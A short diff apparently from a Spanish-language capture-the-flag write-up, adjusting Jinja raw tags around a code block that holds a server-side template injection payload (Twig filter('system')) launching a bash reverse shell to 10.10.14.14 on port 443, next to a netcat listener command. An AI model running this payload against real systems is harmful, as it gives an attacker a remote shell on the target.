@@ -337,7 +337,9 @@ nc -nlvp 443
 
 Ejecutamos el payload:
 ```bash
-{% raw %}{% raw %}{% raw %}{{["bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"]|filter("system")|join(",")}}{% endraw %}{% endraw %}{% endraw %}
+{% raw %}
+{{["bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"]|filter("system")|join(",")}}
+{% endraw %}
 ```
 
 ---
